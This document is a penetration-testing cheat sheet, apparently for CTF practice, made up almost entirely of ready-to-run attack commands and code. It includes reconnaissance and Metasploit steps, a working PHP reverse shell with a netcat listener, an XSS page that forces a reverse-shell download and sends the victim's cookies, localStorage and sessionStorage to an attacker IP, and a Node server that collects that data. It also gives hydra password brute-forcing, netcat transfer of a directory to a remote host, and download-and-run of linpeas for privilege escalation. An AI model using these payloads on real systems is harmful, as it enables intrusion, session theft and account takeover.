## Network scan with`nmap`:
```bash
nmap -v -sV -O -A --top-ports 1000 -oN nmap_output.txt example.com
```

## Directory enumeration with `dirb`:
```bash
dirb http://example.com /usr/share/wordlists/dirb/common.txt -o dirb_output.txt
```

## Subdomains enumeration with `ffuf`:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://example.com -H "Host: FUZZ.example.com" -mc 200 -fs 15949 -o ffuf_output.json -of json
```

## Web app scan with `nikto`:
```bash
nikto -h example.com -p 80 -o nikto_output.txt
```

## Exploit with `metasploit`:
```bash
msfconsole

show

search <exploit_name>

use exploit/linux/http/exploit_name

set RHOSTS example.com
set RPORT 80

show payloads
set payload <payload_name>

exploit
```

## PHP reverse shell
### Listener:
```bash
nc -lvnp 4444
```
### Reverse shell:
```php
<?php
$ip = 'x.x.x.x'; // change this to your IP address
$port = 4444; // change this to your listening port
$socket = fsockopen($ip, $port);
if ($socket) {
    $shell = 'uname -a; w; id; /bin/sh -i';
    fwrite($socket, $shell);
    while (!feof($socket)) {
        $command = fgets($socket);
        $output = '';
        if ($command) {
            $output = shell_exec($command);
            fwrite($socket, $output);
        }
    }
    fclose($socket);
}
?>
```

## XSS/CSRF attack
### Serve:
```bash
mkdir xss
cd xss
nano index.html
sudo python3 -m http.server 4444
```
### index.html:
```bash
<html>
  <head>
    <title>CTF</title>
    <script>
      (async function() {
        const YOUR_SERVER_IP = "10.10.10.100"

        try {
          // Create an anchor element dynamically
          var link = document.createElement('a');
        
          // Set the href to your hosted reverse shell
          link.href = `http://${YOUR_SERVER_IP}:4444/reverse-shell.php`;
        
          // Set the download attribute to suggest a filename for the browser
          link.download = 'reverse-shell.php';
        
          // Append the link to the document body
          document.body.appendChild(link);
        
          // Programmatically click the link to start the download
          link.click();
          
          // Remove the link from the DOM
          document.body.removeChild(link);

          // Collect User-Agent
          let userAgent = navigator.userAgent;

          // Collect Cookies
          let cookies = document.cookie;

          // Collect Local Storage Data
          let localStorageData = {};
          for (let i = 0; i < localStorage.length; i++) {
            let key = localStorage.key(i);
            localStorageData[key] = localStorage.getItem(key);
          }

          // Collect Session Storage Data
          let sessionStorageData = {};
          for (let i = 0; i < sessionStorage.length; i++) {
            let key = sessionStorage.key(i);
            sessionStorageData[key] = sessionStorage.getItem(key);
          }

          // Collect Document Properties
          let documentData = {
            title: document.title,
            url: document.URL,
            referrer: document.referrer,
            domain: document.domain
          };

          // Create a final object to hold all the data
          let data = {
            userAgent: userAgent,
            cookies: cookies,
            localStorage: localStorageData,
            sessionStorage: sessionStorageData,
            document: documentData
          };

          // Send the data to your server
          let img = new Image();
          img.src = `http://${YOUR_SERVER_IP}:5555/?allData=` + encodeURIComponent(JSON.stringify(data));
        } catch (error) {
          let img = new Image();
          img.src = `http://${YOUR_SERVER_IP}:5555/?error=` + encodeURIComponent(error);
        }
      })();
    </script>
  </head>
  <body>
    <h1>Hi Admin!</h1>
  </body>
</html>
```
### Listen:
```bash
mkdir cookies
cd cookies
nano index.js
node index.js
```
### index.js:
```bash
const http = require('http');
const url = require('url');

// Create a server to receive the data
http.createServer((req, res) => {
  // Parse the incoming request's query parameters
  const queryObject = url.parse(req.url, true).query;

  // Check if there's an 'allData' parameter
  if (queryObject.allData) {
    // Parse the received data
    const receivedData = JSON.parse(decodeURIComponent(queryObject.allData));

    // Display the received data in a readable format
    console.log('--- Received Data from Admin ---\n');
    
    // Display User Agent
    console.log('User-Agent: ', receivedData.userAgent, '\n');

    // Display Cookies
    console.log('Cookies: ', receivedData.cookies || 'No cookies found', '\n');

    // Display Local Storage
    console.log('Local Storage:');
    console.table(receivedData.localStorage);

    // Display Session Storage
    console.log('\nSession Storage:');
    console.table(receivedData.sessionStorage);

    // Display Document Data
    console.log('\nDocument Data:');
    console.table(receivedData.document);

  } else if (queryObject.error) {
    // Log any errors that were encountered
    console.error('Error: ', decodeURIComponent(queryObject.error));
  } else {
    console.log('Unknown Data Received:', queryObject);
  }

  // Send a response back to acknowledge receipt
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Data received and logged');
}).listen(5555, () => {
  console.log('Server listening on port 5555');
});

```

## Login brute-force with `hydra`
### Syntax 1:
```bash
sudo hydra -v -V -d -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt http-post-form://example.com/login"&username=^USER^&password=^PASS^:F=Bad"
```
### Syntax 2:
```bash
sudo hydra -v -V -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt example.com http-post-form "/login:username=^USER^&password=^PASS^=:F=Bad"
```

## Send directory with `netcat`
### Sender:
```bash
tar -czf directory.tar.gz ./directory
cat directory.tar.gz | nc example.com 1234
```
### Receiver:
```bash
nc -l -p 1234 > directory.tar.gz
```

## Archive
### Compress:
```bash
tar -czvf archive.tar.gz /path/to/directory_or_file
```
### Extract:
```bash
tar -xzvf archive.tar.gz -C /path/to/extract
```

## Privilege escalation with `linpeas`
### Serve:
```bash
mkdir linpeas
cd linpeas
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
sudo python3 -m http.server 8080
```
### Download and execute:
```bash
cd /tmp
wget x.x.x.x:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a > ./output.txt
less -r ./output.txt
```
